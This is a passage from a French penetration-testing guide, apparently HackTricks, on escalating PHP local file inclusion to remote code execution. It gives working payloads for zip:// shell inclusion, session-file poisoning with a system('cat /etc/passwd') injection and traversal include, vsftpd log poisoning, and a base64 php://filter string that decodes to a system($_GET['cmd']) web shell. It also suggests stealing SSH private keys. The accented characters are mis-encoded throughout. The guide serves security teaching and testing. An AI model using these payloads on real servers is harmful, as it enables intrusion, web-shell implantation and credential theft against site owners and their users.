http://example.com/index.php?page=path/to/uploaded/file.png
```
### Via t√©l√©chargement de fichier Zip

T√©l√©chargez un fichier ZIP contenant un shell PHP compress√© et acc√©dez :
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via sessions PHP

V√©rifiez si le site web utilise la session PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
En PHP, ces sessions sont stock√©es dans des fichiers _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
D√©finissez le cookie sur `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Utilisez le LFI pour inclure le fichier de session PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Si ssh est actif, v√©rifiez quel utilisateur est utilis√© (/proc/self/status & /etc/passwd) et essayez d'acc√©der √† **\<HOME>/.ssh/id\_rsa**

### **Via** **logs** **vsftpd**

Les journaux du serveur FTP vsftpd se trouvent √† _**/var/log/vsftpd.log**_. Dans le sc√©nario o√π une vuln√©rabilit√© d'inclusion de fichier local (LFI) existe et que l'acc√®s √† un serveur vsftpd expos√© est possible, les √©tapes suivantes peuvent √™tre envisag√©es :

1. Injectez une charge utile PHP dans le champ nom d'utilisateur lors du processus de connexion.
2. Apr√®s l'injection, utilisez le LFI pour r√©cup√©rer les journaux du serveur depuis _**/var/log/vsftpd.log**_.

### Via filtre php base64 (en utilisant base64)

Comme le montre [cet](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, le filtre base64 PHP ignore simplement les caract√®res non base64. Vous pouvez l'utiliser pour contourner la v√©rification de l'extension de fichier : si vous fournissez du base64 se terminant par ".php", il ignorera simplement le "." et ajoutera "php" au base64. Voici un exemple de charge utile :
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via filtres php (aucun fichier n√©cessaire)

Ce [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explique que vous pouvez utiliser **des filtres php pour g√©n√©rer un contenu arbitraire** en sortie. Ce qui signifie essentiellement que vous pouvez **g√©n√©rer du code php arbitraire** pour l'inclusion **sans avoir besoin de l'√©crire** dans un fichier.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via une erreur de segmentation

**T√©l√©chargez** un fichier qui sera stock√© de mani√®re **temporaire** dans `/tmp`, puis dans la **m√™me requ√™te**, d√©clenchez une **erreur de segmentation**, et alors le **fichier temporaire ne sera pas supprim√©** et vous pourrez le rechercher.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via le stockage de fichiers temporaires Nginx

Si vous avez trouv√© une **inclusion de fichier local** et que **Nginx** est en cours d'ex√©cution devant PHP, vous pourriez √™tre en mesure d'obtenir une ex√©cution de code √† distance avec la technique suivante :

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

Si vous avez trouv√© une **inclusion de fichier local** m√™me si vous **n'avez pas de session** et que `session.auto_start` est `Off`. Si vous fournissez le **`PHP_SESSION_UPLOAD_PROGRESS`** dans les donn√©es **POST multipart**, PHP va **activer la session pour vous**. Vous pourriez en abuser pour obtenir une ex√©cution de code √† distance :

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session_upload_progress.md)
{% endcontent-ref %}

### Via les t√©l√©versements de fichiers temporaires dans Windows

Si vous avez trouv√© une **inclusion de fichier local** et que le serveur fonctionne sous **Windows**, vous pourriez obtenir une ex√©cution de code √† distance :

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via phpinfo() (file\_uploads = on)

Si vous avez trouv√© une **inclusion de fichier local** et qu'un fichier expose **phpinfo()** avec file\_uploads = on, vous pouvez obtenir une ex√©cution de code √† distance :

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Divulgation de chemin

Si vous avez trouv√© une **inclusion de fichier local** et que vous **pouvez exfiltrer le chemin** du fichier temporaire MAIS que le **serveur** v√©rifie si le **fichier √† inclure comporte des marques PHP**, vous pouvez essayer de **contourner cette v√©rification** avec cette **Condition de Course** :

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Via attente √©ternelle + force brute

Si vous pouvez abuser de l'inclusion de fichier local pour **t√©l√©verser des fichiers temporaires** et faire **suspension** de l'ex√©cution PHP du serveur, vous pourriez ensuite **forcer les noms de fichiers pendant des heures** pour trouver le fichier temporaire :

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Vers une Erreur Fatale

Si vous incluez l'un des fichiers `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Vous devez inclure le m√™me deux fois pour provoquer cette erreur).

**Je ne sais pas √† quoi cela peut servir mais cela pourrait √™tre utile.**\
_M√™me si vous provoquez une Erreur Fatale PHP, les fichiers temporaires PHP t√©l√©vers√©s sont supprim√©s._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## R√©f√©rences

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes en s√©curit√© !

**Perspectives sur le Hacking**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du hacking

**Actualit√©s de Hacking en Temps R√©el**\
Restez inform√© du monde du hacking en √©volution rapide gr√¢ce √† des actualit√©s et des analyses en temps r√©el

**Derni√®res Annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
